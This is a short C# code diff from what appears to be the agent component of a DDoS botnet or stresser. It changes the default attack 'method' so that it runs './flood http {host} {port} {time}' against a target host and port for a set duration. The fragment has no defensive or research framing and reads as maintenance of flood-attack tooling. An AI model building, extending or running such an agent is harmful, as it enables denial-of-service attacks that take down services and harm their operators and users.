@@ -471,7 +471,7 @@ namespace Agent
                 Console.WriteLine("[!] methods.json not found, creating default method");
                 _methods = new List<MethodConfig>
                 {
-                    new MethodConfig { Name = "http", Cmd = "./http {host} {port} {time}" }
+                    new MethodConfig { Name = "http", Cmd = "./flood http {host} {port} {time}" }
                 };
                 File.WriteAllText("methods.json", JsonSerializer.Serialize(_methods, new JsonSerializerOptions { WriteIndented = true }));
             }
